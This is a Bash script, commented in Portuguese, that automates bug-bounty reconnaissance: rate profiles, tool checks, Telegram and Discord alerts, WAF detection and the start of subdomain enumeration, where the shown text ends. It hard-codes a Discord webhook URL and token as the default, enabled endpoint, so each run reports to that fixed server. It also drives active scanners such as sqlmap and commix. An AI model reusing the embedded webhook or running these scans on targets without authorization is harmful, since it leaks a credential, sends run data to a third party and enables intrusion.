#!/usr/bin/env bash
# bugbounty_scanner_enhanced.sh
# Enhanced automated bug-bounty reconnaissance & scanning pipeline
# MELHORADO COM PERFIS INTERATIVOS + CONTROLES DE SEGURANÇA
# Target platform: Kali Linux / Security distributions
# Author:Kirby656 & Enhanced by AI Assistant
# License: Use only on targets you are authorized to test.

# ============= AVISOS DE SEGURANÇA E ÉTICA =============
# ⚠️  IMPORTANTE: Use apenas em alvos autorizados para teste
# ⚠️  Para perfis agressivos, use VPS dedicado (não rede doméstica)  
# ⚠️  Monitore logs e ajuste rate limits conforme necessário
# ⚠️  Dry-run habilitado por padrão - use --confirm para ações ativas
# ⚠️  Toda atividade de scanning deve ter autorização prévia

set -euo pipefail
IFS=$'\n\t'

# ============= LOAD ENTERPRISE FEATURES MODULE =============
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
if [[ -f "$SCRIPT_DIR/enterprise-features.sh" ]]; then
    source "$SCRIPT_DIR/enterprise-features.sh"
    log_info "✅ Enterprise features module loaded"
elif [[ -f "$(dirname "$0")/enterprise-features.sh" ]]; then
    source "$(dirname "$0")/enterprise-features.sh"
fi

# ============= SISTEMA DE PERFIS E CONFIGURAÇÕES =============
# Parse command line arguments
PROFILE=""
DRY_RUN=true
SKIP_CONFIRMATION=false
EXPORT_JSON=false

# Parse argumentos da linha de comando
while [[ $# -gt 0 ]]; do
    case $1 in
        --profile=*)
            PROFILE="${1#*=}"
            shift
            ;;
        --confirm|--no-dry-run)
            DRY_RUN=false
            shift
            ;;
        --yes)
            SKIP_CONFIRMATION=true
            shift
            ;;
        --dry-run)
            DRY_RUN=true
            shift
            ;;
        --export-json)
            EXPORT_JSON=true
            shift
            ;;
        --resume)
            RESUME_MODE=true
            shift
            ;;
        --help)
            echo "Usage: $0 [options] scope.txt"
            echo "Options:"
            echo "  --profile=PROFILE    Set profile: light, balanced, aggressive"
            echo "  --confirm            Disable dry-run mode (enable active scanning)"
            echo "  --dry-run            Enable dry-run mode (default)"
            echo "  --yes                Skip confirmation prompts"
            echo "  --export-json        Export results in JSON format"
            echo "  --resume             Resume from last checkpoint"
            echo ""
            echo "Enterprise Features:"
            echo "  • Intelligent deduplication"
            echo "  • WAF detection & evasion"
            echo "  • Checkpoint/resume system"
            echo "  • Adaptive rate limiting"
            echo "  • Target prioritization"
            echo "  • Vulnerability correlation"
            echo "  • False positive filtering"
            echo "  • CVSS scoring"
            echo "  • Discord webhook notifications"
            echo "  • Bug bounty platform exports"
            echo "  • Statistical analysis"
            echo "  • Automated revalidation"
            echo "  • Resource management"
            echo "  • Screenshot analysis"
            echo "  • CI/CD integration"
            exit 0
            ;;
        -*)
            echo "Unknown option: $1" >&2
            exit 1
            ;;
        *)
            SCOPE_FILE="$1"
            shift
            ;;
    esac
done

# ============= PROMPT INTERATIVO DE PERFIS =============
show_profile_menu() {
    echo ""
    echo "🎯 Selecione o perfil de execução:"
    echo ""
    echo "1) light      - Seguro para rede doméstica (baixo impacto)"
    echo "   • Concorrência: 8 threads"
    echo "   • Rate limit: 20/s"
    echo "   • Timeouts conservadores"
    echo ""
    echo "2) balanced   - Recomendado para VM 8GB/4cores (padrão)" 
    echo "   • Concorrência: 20 threads"
    echo "   • Rate limit: 100/s"  
    echo "   • Timeouts médios"
    echo ""
    echo "3) aggressive - Somente VPS dedicado (alto paralelismo)"
    echo "   • Concorrência: 50 threads"
    echo "   • Rate limit: 300/s"
    echo "   • Timeouts agressivos"
    echo ""
    echo -n "Escolha [1-3] ou [light/balanced/aggressive] (Enter = balanced): "
}

# Configurar perfil interativamente se necessário
if [[ -z "$PROFILE" ]]; then
    # Usar variável de ambiente se disponível
    PROFILE="${PROFILE:-}"
    
    # Se ainda não definido e rodando em TTY, mostrar menu
    if [[ -z "$PROFILE" ]] && [[ -t 0 ]] && [[ -t 1 ]]; then
        show_profile_menu
        read -r user_input
        
        case "$user_input" in
            1|light)
                PROFILE="light"
                ;;
            2|balanced|"")
                PROFILE="balanced"
                ;;
            3|aggressive)
                PROFILE="aggressive"
                ;;
            *)
                echo "❌ Opção inválida. Usando 'balanced' como padrão."
                PROFILE="balanced"
                ;;
        esac
    fi
fi

# Definir padrão se ainda não configurado
PROFILE="${PROFILE:-balanced}"

# ============= CONFIGURAÇÃO DOS PERFIS =============
configure_profile() {
    case "$PROFILE" in
        light)
            CONCURRENCY=8
            PARALLEL_HOSTS=2
            RATE_LIMIT=20
            TIMEOUT_PER_HOST="20s"
            NUCLEI_FLAGS="-c 5 -rate-limit 20 -timeout 5"
            MAX_CRAWL_DEPTH=1
            MAX_JS_FILES=20
            NCPU=2
            ;;
        balanced)
            CONCURRENCY=25
            PARALLEL_HOSTS=4
            RATE_LIMIT=150
            TIMEOUT_PER_HOST="60s"
            NUCLEI_FLAGS="-c 30 -rate-limit 150 -timeout 10"
            MAX_CRAWL_DEPTH=4
            MAX_JS_FILES=100
            NCPU=$(nproc 2>/dev/null || echo 4)
            ;;
        aggressive)
            CONCURRENCY=50
            PARALLEL_HOSTS=12
            RATE_LIMIT=200
            TIMEOUT_PER_HOST="60s"
            NUCLEI_FLAGS="-c 60 -rate-limit 300 -timeout 10"
            MAX_CRAWL_DEPTH=3
            MAX_JS_FILES=100
            NCPU=$(nproc 2>/dev/null || echo 8)
            ;;
        *)
            echo "❌ Perfil desconhecido: $PROFILE"
            exit 1
            ;;
    esac
}

# Configurar perfil selecionado
configure_profile

# defaults (podem vir do topo do script / PROFILE)
CONCURRENCY="${CONCURRENCY:-20}"      # padrão balanced
RATE_LIMIT="${RATE_LIMIT:-100}"
NUCLEI_TIMEOUT_SECONDS="${NUCLEI_TIMEOUT_SECONDS:-7}"

# pegar help do nuclei (sem caracteres estranhos)
unalias nuclei 2>/dev/null || true
NUCLEI_HELP="$(nuclei -h 2>&1 || true)"
# fallback se nuclei não instalado: NUCLEI_HELP vazio

# detectar flags suportadas
NUCLEI_CONC_FLAG=""
NUCLEI_RL_FLAG=""
NUCLEI_TO_FLAG=""

if grep -qE '(^|[[:space:]])(-concurrency|--concurrency)([[:space:]]|$)' <<<"$NUCLEI_HELP"; then
  NUCLEI_CONC_FLAG="-concurrency"
elif grep -qE '(^|[[:space:]])(-c[[:space:]]| -c$| -c,|^ -c)' <<<"$NUCLEI_HELP"; then
  NUCLEI_CONC_FLAG="-c"
fi

if grep -qE '(^|[[:space:]])(-rl|--rate-limit|--rl)([[:space:]]|$)' <<<"$NUCLEI_HELP"; then
  # some versions use -rl, some use -rate-limit
  if grep -qE '(^|[[:space:]])-rl([[:space:]]|$)' <<<"$NUCLEI_HELP"; then
    NUCLEI_RL_FLAG="-rl"
  else
    NUCLEI_RL_FLAG="-rate-limit"
  fi
fi

if grep -qE '(^|[[:space:]])(-timeout|--timeout)([[:space:]]|$)' <<<"$NUCLEI_HELP"; then
  NUCLEI_TO_FLAG="-timeout"
fi

# Build an array of nuclei args (safe splitting, no quoting issues)
build_nuclei_args() {
  local -n _arr=$1   # name ref to return array
  _arr=()

  # allow override via env var NUCLEI_FLAGS_PRESET (string) if user set it
  if [[ -n "${NUCLEI_FLAGS_PRESET:-}" ]]; then
    read -r -a preset_tokens <<< "${NUCLEI_FLAGS_PRESET}"
    for t in "${preset_tokens[@]}"; do
      _arr+=("$t")
    done
  else
    # add concurrency if supported
    if [[ -n "$NUCLEI_CONC_FLAG" ]]; then
      _arr+=("$NUCLEI_CONC_FLAG" "$CONCURRENCY")
    fi
    # add rate limit if supported
    if [[ -n "$NUCLEI_RL_FLAG" ]]; then
      _arr+=("$NUCLEI_RL_FLAG" "$RATE_LIMIT")
    fi
    # add timeout if supported (nuclei supports seconds or duration)
    if [[ -n "$NUCLEI_TO_FLAG" ]]; then
      _arr+=("$NUCLEI_TO_FLAG" "$NUCLEI_TIMEOUT_SECONDS")
    fi
  fi

  # Always add -silent unless user explicitly wants verbose
  _arr+=("-silent")
}

# Build extended flags array (if you want different presets for extended runs)
build_nuclei_args NUCLEI_ARGS
NUCLEI_FLAGS_EXT_PRESET="${NUCLEI_FLAGS_EXT_PRESET:-}"
if [[ -n "$NUCLEI_FLAGS_EXT_PRESET" ]]; then
  read -r -a tmp <<< "$NUCLEI_FLAGS_EXT_PRESET"
  NUCLEI_ARGS_EXT=("${tmp[@]}")
else
  NUCLEI_ARGS_EXT=("${NUCLEI_ARGS[@]}")
fi

# ============= CONFIGURAÇÕES ADICIONAIS =============
OUTDIR="results_$(date +%Y%m%d_%H%M%S)"
SCOPE_FILE="${SCOPE_FILE:-}"
CHAOS_KEY=${CHAOS_KEY:-""}
SAVE_JS=true
USER_AGENT="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36"
THROTTLE_CMD="${THROTTLE_CMD:-}"

# Timeouts/limites específicos (configuráveis via env)
TIMEOUT_PER_CALL="${TIMEOUT_PER_CALL:-60s}"  # timeout por URL no download de JS

# TELEGRAM CONFIG
TELEGRAM_BOT_TOKEN="${TELEGRAM_BOT_TOKEN:-}"
TELEGRAM_CHAT_ID="${TELEGRAM_CHAT_ID:-}"
INSTANCE_ID="$(hostname)_$$_$(date +%s%N | cut -b1-13)"
TELEGRAM_QUEUE_DIR="/tmp/telegram_queue_${USER:-root}"
TELEGRAM_LAST_SEND_FILE="/tmp/telegram_last_send_${USER:-root}"

# ============= DISCORD WEBHOOK CONFIG (ENTERPRISE FEATURE #9) =============
DISCORD_WEBHOOK_URL="${DISCORD_WEBHOOK_URL:-https://discord.com/api/webhooks/1423586545562026005/Z8H0aW-DOd0M29nCNfIjgFSfL7EQVTUZwdFo07_UV4iUwMj8SSybO8JxC_GvkRfpkhP-}"
DISCORD_ENABLED=true

# ============= ENTERPRISE FEATURES CONFIG =============
# Feature #1: Deduplication
DEDUP_DIR="/tmp/scanner_dedup_${USER:-root}"
DEDUP_CACHE_DURATION=86400  # 24 hours

# Feature #3: Checkpoint/Resume
CHECKPOINT_DIR=".checkpoints"
RESUME_MODE=false
[[ "$*" =~ --resume ]] && RESUME_MODE=true

# Feature #4: Adaptive Rate Limiting
CURRENT_RATE_LIMIT=$RATE_LIMIT
RATE_LIMIT_BACKOFF=0.5
RATE_429_COUNT=0

# Feature #5: Scoring/Prioritization
PRIORITY_SCORE_FILE="priority_scores.json"

# Feature #7: False Positive Filtering
FP_PATTERNS_FILE="false_positive_patterns.txt"

# Feature #8: CVSS Scoring
CVSS_SCORES_FILE="cvss_scores.json"

# Feature #12: Revalidation
REVALIDATION_QUEUE="revalidation_queue.txt"

# Feature #13: Resource Management
MAX_CPU_PERCENT=80
MAX_MEM_PERCENT=85

# Feature #14: Screenshot Analysis
SCREENSHOT_ANALYSIS_DIR="screenshot_analysis"
OCR_ENABLED=false
command -v tesseract >/dev/null 2>&1 && OCR_ENABLED=true

# Mostrar configuração selecionada
echo ""
echo "🔧 Configuração selecionada:"
echo "   Perfil: $PROFILE"
echo "   Concorrência: $CONCURRENCY"
echo "   Hosts paralelos: $PARALLEL_HOSTS"
echo "   Rate limit: $RATE_LIMIT/s"
echo "   Timeout por host: $TIMEOUT_PER_HOST"
echo "   Max JS files: $MAX_JS_FILES"
echo "   CPUs: $NCPU"
echo "   Modo: $([ "$DRY_RUN" = "true" ] && echo "DRY-RUN (apenas coleta)" || echo "ATIVO (scanning completo)")"
echo ""

# ============= CONFIRMAÇÃO FINAL =============
if [[ "$DRY_RUN" = "false" ]] && [[ "$SKIP_CONFIRMATION" = "false" ]]; then
    echo "⚠️  ATENÇÃO: Modo ATIVO selecionado!"
    echo "   Isso executará varreduras ativas (nuclei, naabu, sqlmap, etc.)"
    echo "   Certifique-se de ter autorização para testar os alvos."
    echo ""
    echo -n "Continuar com scanning ativo? [y/N]: "
    read -r confirmation
    
    if [[ ! "$confirmation" =~ ^[Yy]$ ]]; then
        echo "❌ Cancelado pelo usuário."
        exit 0
    fi
fi

# ============= FERRAMENTAS APRIMORADAS =============
# Função para detectar getJS com variações de nome e PATH - Correção: movida para antes de check_tools()
detect_getjs() {
    local getjs_bin=""
    
    # Tentar diferentes variações do nome do binário
    for variant in getJS getjs GetJS GetJs; do
        if command -v "$variant" >/dev/null 2>&1; then
            getjs_bin="$variant"
            break
        fi
    done
    
    # Se não encontrou, verificar em $GOPATH/bin
    if [[ -z "$getjs_bin" ]] && [[ -n "$GOPATH" ]]; then
        for variant in getJS getjs GetJS GetJs; do
            if [[ -x "$GOPATH/bin/$variant" ]]; then
                getjs_bin="$GOPATH/bin/$variant"
                break
            fi
        done
    fi
    
    # Verificar também /usr/local/bin
    if [[ -z "$getjs_bin" ]]; then
        for variant in getJS getjs GetJS GetJs; do
            if [[ -x "/usr/local/bin/$variant" ]]; then
                getjs_bin="/usr/local/bin/$variant"
                break
            fi
        done
    fi
    
    echo "$getjs_bin"
}

REQUIRED_TOOLS=(subfinder httpx nuclei jq curl wget)
OPTIONAL_TOOLS=(amass findomain naabu gau waybackurls hakrawler katana gf qsreplace dalfox sqlmap gospider getjs aria2c massdns subjack ffuf dirsearch gobuster)

# ============= EXTRA TOOLS ARRAY =============
EXTRA_TOOLS=(
    kxss gxss linkfinder xnLinkFinder paramspider arjun 
    secretfinder trufflehog gitleaks git-dumper commix 
    lfisuite smuggler ssrfmap httprobe gowitness aquatone 
    s3scanner cloud_enum
)

check_tools() {
    local missing_required=()
    local missing_optional=()
    
    echo "🔍 Verificando ferramentas..."
    
    for tool in "${REQUIRED_TOOLS[@]}"; do
        if ! command -v "$tool" >/dev/null 2>&1; then
            missing_required+=("$tool")
        fi
    done
    
    for tool in "${OPTIONAL_TOOLS[@]}"; do
        # Correção: tratar getjs especialmente usando detecção melhorada
        if [[ "$tool" == "getjs" ]]; then
            if [[ -z "$(detect_getjs)" ]]; then
                missing_optional+=("$tool")
            fi
        elif ! command -v "$tool" >/dev/null 2>&1; then
            missing_optional+=("$tool")
        fi
    done
    
    if [[ ${#missing_required[@]} -gt 0 ]]; then
        echo "❌ Ferramentas obrigatórias faltando: ${missing_required[*]}"
        echo "   Instale e execute novamente."
        exit 1
    fi
    
    if [[ ${#missing_optional[@]} -gt 0 ]]; then
        echo "⚠️  Ferramentas opcionais faltando: ${missing_optional[*]}"
        echo "   Continuando sem elas..."
    fi
    
    echo "✅ Verificação de ferramentas completa"
}

check_tools

# Validate scope file
if [[ -z "$SCOPE_FILE" ]] || [[ ! -f "$SCOPE_FILE" ]]; then
    echo "Usage: $0 [options] scope.txt"
    echo "scope.txt deve conter um domínio por linha (exemplo.com)" >&2
    exit 1
fi

# ============= ESTRUTURA DE DIRETÓRIOS MELHORADA =============
setup_directories() {
    mkdir -p "$OUTDIR"
    cd "$OUTDIR" || exit 1
    
    # Criar estrutura completa de diretórios incluindo para EXTRA_TOOLS
    mkdir -p raw subs alive tech ports urls js js/downloads nuclei poc poc/notes reports html logs apis secrets endpoints
    mkdir -p logs/{subdomain,httpx,nuclei,sqlmap,crawling,extra_tools}
    mkdir -p reports/{kxss,gxss,linkfinder,xnlinkfinder,paramspider,arjun,secretfinder,trufflehog,gitleaks,git_dumper,commix,lfisuite,smuggler,ssrfmap,httprobe,gowitness,aquatone,s3scanner,cloud_enum}
    mkdir -p screenshots
    
    # ENTERPRISE: Diretórios adicionais
    mkdir -p "$CHECKPOINT_DIR" "$SCREENSHOT_ANALYSIS_DIR"
    mkdir -p correlation cvss_analysis revalidation bugbounty_exports
    
    cp "$OLDPWD/$SCOPE_FILE" scope.txt
    
    # Initialize enterprise features
    init_deduplication
    init_telegram_queue
    
    # Send initial notification
    send_discord_notification "🚀 Scan Started" "Starting reconnaissance scan\nProfile: **$PROFILE**\nMode: **$([ "$DRY_RUN" = "true" ] && echo "DRY-RUN" || echo "ACTIVE")**" 3066993
    
    echo "📁 Estrutura de diretórios criada em: $(pwd)"
}

setup_directories

# ============= FUNÇÕES UTILITÁRIAS MELHORADAS =============
safe_count() {
    local file="$1"
    if [[ -f "$file" ]] && [[ -s "$file" ]]; then
        wc -l < "$file" | tr -d ' \n'
    else
        echo "0"
    fi
}

log_info() {
    local message="$*"
    echo "[$(date '+%H:%M:%S')] $message" | tee -a logs/scanner.log
}

log_error() {
    local message="$*" 
    echo "[$(date '+%H:%M:%S')] ERROR: $message" >&2 | tee -a logs/errors.log
}

# ============= FUNÇÕES DO TELEGRAM APRIMORADAS =============
init_telegram_queue() {
    mkdir -p "$TELEGRAM_QUEUE_DIR" 2>/dev/null || true
    touch "$TELEGRAM_LAST_SEND_FILE" 2>/dev/null || true
}

telegram_rate_limit() {
    local min_interval=2
    local last_send=0
    
    if [[ -f "$TELEGRAM_LAST_SEND_FILE" ]]; then
        last_send=$(cat "$TELEGRAM_LAST_SEND_FILE" 2>/dev/null || echo 0)
    fi
    
    local current_time=$(date +%s)
    local time_diff=$((current_time - last_send))
    
    if [[ "$time_diff" -lt "$min_interval" ]]; then
        local sleep_time=$((min_interval - time_diff + 1))
        sleep "$sleep_time"
    fi
    
    echo "$current_time" > "$TELEGRAM_LAST_SEND_FILE" 2>/dev/null || true
}

send_telegram_message_enhanced() {
    local message="$1"
    local urgent="${2:-false}"
    local max_retries=3
    local retry_count=0
    
    if [[ -z "$TELEGRAM_BOT_TOKEN" ]] || [[ -z "$TELEGRAM_CHAT_ID" ]]; then
        return 0
    fi
    
    # Rate limiting
    telegram_rate_limit
    
    # Add instance identifier
    local instance_suffix="
🔧 Instance: \`${INSTANCE_ID:0:8}...\`"
    local formatted_message="$message$instance_suffix"
    
    while [[ "$retry_count" -lt "$max_retries" ]]; do
        if curl -s -m 15 -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
             -d chat_id="${TELEGRAM_CHAT_ID}" \
             -d parse_mode="Markdown" \
             -d text="$formatted_message" >/dev/null 2>&1; then
            return 0
        fi
        
        retry_count=$((retry_count + 1))
        log_error "Telegram send failed (attempt $retry_count/$max_retries)"
        
        local backoff=$(( (2 ** retry_count) + (RANDOM % 3) ))
        sleep "$backoff"
    done
    
    log_error "Failed to send Telegram message after $max_retries attempts"
    return 1
}

send_telegram_status() {
    local message="$1"
    local urgent="${2:-false}"
    
    if [[ -n "$TELEGRAM_BOT_TOKEN" ]] && [[ -n "$TELEGRAM_CHAT_ID" ]]; then
        local emoji="📊"
        [[ "$urgent" = "true" ]] && emoji="🚨"
        
        local formatted_message="${emoji} *Bug Bounty Scanner*
📁 \`$(basename "$(pwd)")\`
🕐 \`$(date '+%H:%M:%S')\`
🔧 Perfil: \`$PROFILE\` $([ "$DRY_RUN" = "true" ] && echo "(DRY-RUN)" || echo "(ATIVO)")

$message"
        
        send_telegram_message_enhanced "$formatted_message" "$urgent"
    fi
}

# ============= ENTERPRISE FEATURE #9: DISCORD WEBHOOK NOTIFICATIONS =============
send_discord_notification() {
    local title="$1"
    local description="$2"
    local color="${3:-5814783}"  # Default blue
    local urgent="${4:-false}"
    
    [[ "$DISCORD_ENABLED" != "true" ]] && return 0
    [[ -z "$DISCORD_WEBHOOK_URL" ]] && return 0
    
    # Color codes: Red=15158332, Yellow=16776960, Green=3066993, Blue=5814783
    [[ "$urgent" = "true" ]] && color=15158332
    
    local timestamp=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
    local payload=$(cat <<EOF
{
  "embeds": [{
    "title": "$title",
    "description": "$description",
    "color": $color,
    "timestamp": "$timestamp",
    "footer": {
      "text": "Profile: $PROFILE | Instance: ${INSTANCE_ID:0:12}"
    },
    "fields": [
      {
        "name": "Mode",
        "value": "$([ "$DRY_RUN" = "true" ] && echo "🔍 DRY-RUN" || echo "⚡ ACTIVE")",
        "inline": true
      },
      {
        "name": "Directory",
        "value": "\`$(basename "$(pwd)")\`",
        "inline": true
      }
    ]
  }]
}
EOF
)
    
    curl -s -m 10 -X POST "$DISCORD_WEBHOOK_URL" \
        -H "Content-Type: application/json" \
        -d "$payload" >/dev/null 2>&1 || true
}

# ============= ENTERPRISE FEATURE #1: INTELLIGENT DEDUPLICATION =============
init_deduplication() {
    mkdir -p "$DEDUP_DIR" 2>/dev/null || true
    log_info "Deduplication system initialized at $DEDUP_DIR"
}

check_already_tested() {
    local target="$1"
    local hash=$(echo "$target" | sha256sum | cut -d' ' -f1)
    local cache_file="$DEDUP_DIR/${hash}.tested"
    
    if [[ -f "$cache_file" ]]; then
        local age=$(($(date +%s) - $(stat -c %Y "$cache_file" 2>/dev/null || echo 0)))
        if [[ $age -lt $DEDUP_CACHE_DURATION ]]; then
            return 0  # Already tested
        fi
    fi
    return 1  # Not tested yet
}

mark_as_tested() {
    local target="$1"
    local result="$2"
    local hash=$(echo "$target" | sha256sum | cut -d' ' -f1)
    echo "$result" > "$DEDUP_DIR/${hash}.tested"
}

# ============= ENTERPRISE FEATURE #2: WAF DETECTION & EVASION =============
detect_waf() {
    local url="$1"
    local waf_detected="none"
    
    # Detectar headers comuns de WAFs
    local headers=$(timeout 10s curl -s -I "$url" 2>/dev/null || echo "")
    
    if echo "$headers" | grep -qi "cloudflare"; then
        waf_detected="cloudflare"
    elif echo "$headers" | grep -qi "akamai"; then
        waf_detected="akamai"
    elif echo "$headers" | grep -qi "incapsula"; then
        waf_detected="incapsula"
    elif echo "$headers" | grep -qi "aws-waf"; then
        waf_detected="aws-waf"
    elif echo "$headers" | grep -qi "imperva"; then
        waf_detected="imperva"
    fi
    
    echo "$waf_detected"
}

get_random_user_agent() {
    local agents=(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15"
    )
    echo "${agents[$RANDOM % ${#agents[@]}]}"
}

adjust_for_waf() {
    local waf="$1"
    
    case "$waf" in
        cloudflare)
            CURRENT_RATE_LIMIT=$((RATE_LIMIT / 2))
            log_info "WAF Detected: Cloudflare - Reducing rate to $CURRENT_RATE_LIMIT/s"
            ;;
        akamai)
            CURRENT_RATE_LIMIT=$((RATE_LIMIT / 3))
            log_info "WAF Detected: Akamai - Reducing rate to $CURRENT_RATE_LIMIT/s"
            ;;
        *)
            CURRENT_RATE_LIMIT=$RATE_LIMIT
            ;;
    esac
}

# ============= ENTERPRISE FEATURE #3: CHECKPOINT/RESUME SYSTEM =============
save_checkpoint() {
    local phase="$1"
    local status="$2"
    mkdir -p "$CHECKPOINT_DIR"
    
    cat > "$CHECKPOINT_DIR/checkpoint.json" <<EOF
{
  "phase": "$phase",
  "status": "$status",
  "timestamp": "$(date -u +%s)",
  "profile": "$PROFILE",
  "dry_run": "$DRY_RUN"
}
EOF
    log_info "Checkpoint saved: $phase ($status)"
}

load_checkpoint() {
    if [[ -f "$CHECKPOINT_DIR/checkpoint.json" ]] && [[ "$RESUME_MODE" = "true" ]]; then
        local last_phase=$(jq -r '.phase' "$CHECKPOINT_DIR/checkpoint.json" 2>/dev/null || echo "")
        log_info "Resuming from checkpoint: $last_phase"
        echo "$last_phase"
    else
        echo ""
    fi
}

should_skip_phase() {
    local current_phase="$1"
    local checkpoint=$(load_checkpoint)
    
    [[ -z "$checkpoint" ]] && return 1
    
    # Define phase order
    local phases=("subdomain" "live_detection" "port_scan" "url_collection" "vulnerability_scan" "reporting")
    local skip=true
    
    for phase in "${phases[@]}"; do
        [[ "$phase" = "$checkpoint" ]] && skip=false
        [[ "$phase" = "$current_phase" ]] && break
    done
    
    [[ "$skip" = "true" ]] && return 0 || return 1
}

# ============= ENTERPRISE FEATURE #4: ADAPTIVE RATE LIMITING =============
detect_rate_limit_response() {
    local status_code="$1"
    
    if [[ "$status_code" =~ ^(429|503)$ ]]; then
        RATE_429_COUNT=$((RATE_429_COUNT + 1))
        CURRENT_RATE_LIMIT=$(echo "$CURRENT_RATE_LIMIT * $RATE_LIMIT_BACKOFF" | bc | cut -d. -f1)
        [[ $CURRENT_RATE_LIMIT -lt 5 ]] && CURRENT_RATE_LIMIT=5
        
        log_info "⚠️  Rate limiting detected! Reducing to $CURRENT_RATE_LIMIT/s"
        send_discord_notification "⚠️ Rate Limiting" "Rate limit hit. Reducing speed to $CURRENT_RATE_LIMIT/s" 16776960
        
        # Backoff exponencial
        local sleep_time=$((2 ** RATE_429_COUNT))
        [[ $sleep_time -gt 60 ]] && sleep_time=60
        sleep $sleep_time
        
        return 0
    fi
    
    # Recovery: aumentar gradualmente se não houver erros
    if [[ $RATE_429_COUNT -gt 0 ]] && [[ $((RANDOM % 100)) -lt 10 ]]; then
        RATE_429_COUNT=$((RATE_429_COUNT - 1))
        CURRENT_RATE_LIMIT=$((CURRENT_RATE_LIMIT + 5))
        [[ $CURRENT_RATE_LIMIT -gt $RATE_LIMIT ]] && CURRENT_RATE_LIMIT=$RATE_LIMIT
    fi
    
    return 1
}

# ============= ENTERPRISE FEATURE #5: TARGET PRIORITIZATION & SCORING =============
calculate_target_score() {
    local url="$1"
    local score=0
    
    # Pontos por parâmetros
    local param_count=$(echo "$url" | grep -o '=' | wc -l)
    score=$((score + param_count * 10))
    
    # Pontos por palavras-chave interessantes
    echo "$url" | grep -qi "admin\|login\|api\|auth\|user\|search\|id=" && score=$((score + 20))
    echo "$url" | grep -qi "upload\|file\|download\|redirect\|url=" && score=$((score + 15))
    echo "$url" | grep -qi "debug\|test\|dev\|staging" && score=$((score + 25))
    
    # Penalizar static assets
    echo "$url" | grep -qi "\.jpg\|\.png\|\.css\|\.woff" && score=$((score - 50))
    
    # Tamanho da URL (mais longa = mais complexa = mais interessante)
    local url_length=${#url}
    [[ $url_length -gt 100 ]] && score=$((score + 10))
    
    echo "$score"
}

prioritize_targets() {
    local input_file="$1"
    local output_file="$2"
    
    if [[ ! -f "$input_file" ]] || [[ ! -s "$input_file" ]]; then
        touch "$output_file"
        return
    fi
    
    log_info "Prioritizing targets from $input_file..."
    
    > "$PRIORITY_SCORE_FILE"
    while IFS= read -r url; do
        local score=$(calculate_target_score "$url")
        echo "$score|$url" >> "$PRIORITY_SCORE_FILE"
    done < "$input_file"
    
    # Sort by score (descending) and extract URLs
    sort -t'|' -k1 -rn "$PRIORITY_SCORE_FILE" | cut -d'|' -f2 > "$output_file"
    
    local total=$(wc -l < "$output_file")
    log_info "Prioritized $total targets by score"
}

# ============= ENTERPRISE FEATURE #13: RESOURCE MANAGEMENT =============
check_system_resources() {
    local cpu_usage=$(top -bn1 | grep "Cpu(s)" | awk '{print $2}' | cut -d'%' -f1 | cut -d'.' -f1 2>/dev/null || echo 0)
    local mem_usage=$(free | grep Mem | awk '{printf("%.0f", $3/$2 * 100.0)}' 2>/dev/null || echo 0)
    
    if [[ $cpu_usage -gt $MAX_CPU_PERCENT ]] || [[ $mem_usage -gt $MAX_MEM_PERCENT ]]; then
        log_info "⚠️  High resource usage detected (CPU: ${cpu_usage}%, MEM: ${mem_usage}%) - Throttling..."
        
        # Reduzir concorrência temporariamente
        CONCURRENCY=$((CONCURRENCY / 2))
        [[ $CONCURRENCY -lt 2 ]] && CONCURRENCY=2
        
        sleep 5
        return 1
    fi
    
    return 0
}

# ============= PROCESSAMENTO DE ESCOPO MELHORADO =============
process_scope() {
    log_info "Processando escopo e tratando wildcards..."
    while read -r line; do
        # Skip comments and empty lines
        [[ "$line" =~ ^[[:space:]]*# ]] && continue
        [[ -z "${line// }" ]] && continue
        
        line=$(echo "$line" | tr '[:upper:]' '[:lower:]' | sed 's/[[:space:]]*$//')
        
        # Handle wildcards
        if [[ "$line" =~ \* ]]; then
            log_info "Wildcard detectado: $line - Convertendo para domínio base"
            base_domain=$(echo "$line" | sed 's/.*\*\.//g')
            if [[ "$base_domain" =~ ^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; then
                echo "$base_domain"
                log_info "Convertido wildcard $line para: $base_domain"
            else
                log_error "Formato inválido de wildcard: $line - ignorando"
            fi
        else
            # Validate normal domain
            if [[ "$line" =~ ^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; then
                echo "$line"
            else
                log_error "Formato inválido de domínio: $line - ignorando"
            fi
        fi
    done < scope.txt
}

# Initialize Telegram
init_telegram_queue

# ============= INÍCIO DO SCANNER =============
send_telegram_status "🚀 *INICIANDO SCAN*
🎯 Escopo: \`$(basename "$SCOPE_FILE")\`
📍 Diretório: \`$OUTDIR\`
⚙️ Configurações:
- Perfil: $PROFILE
- Threads: $CONCURRENCY
- Rate Limit: $RATE_LIMIT/s
- Depth: $MAX_CRAWL_DEPTH
- Modo: $([ "$DRY_RUN" = "true" ] && echo "DRY-RUN" || echo "ATIVO")"

# Processar escopo
process_scope | sort -u > raw/scope.clean.txt

log_info "Output dir: $(pwd)"
log_info "Domínios válidos processados: $(safe_count raw/scope.clean.txt)"

# Verificar se temos domínios válidos
if [[ ! -s raw/scope.clean.txt ]]; then
    log_error "Nenhum domínio válido encontrado no escopo!"
    send_telegram_status "❌ *ERRO CRÍTICO*
Nenhum domínio válido encontrado no escopo!" true
    exit 1
fi

TOTAL_DOMAINS=$(safe_count raw/scope.clean.txt)
send_telegram_status "✅ *Escopo processado*
📋 $TOTAL_DOMAINS domínios válidos encontrados"

# ============= FASE 1: ENUMERAÇÃO DE SUBDOMÍNIOS MELHORADA =============
echo ""
echo "========== FASE 1: ENUMERAÇÃO DE SUBDOMÍNIOS =========="
send_telegram_status "🔍 *FASE 1: SUBDOMAIN ENUMERATION*
Iniciando descoberta com múltiplas ferramentas..."

subdomain_enumeration() {
    log_info "Iniciando enumeração de subdomínios..."
    
    # Subfinder
    if command -v subfinder >/dev/null 2>&1; then
        log_info "Executando subfinder..."
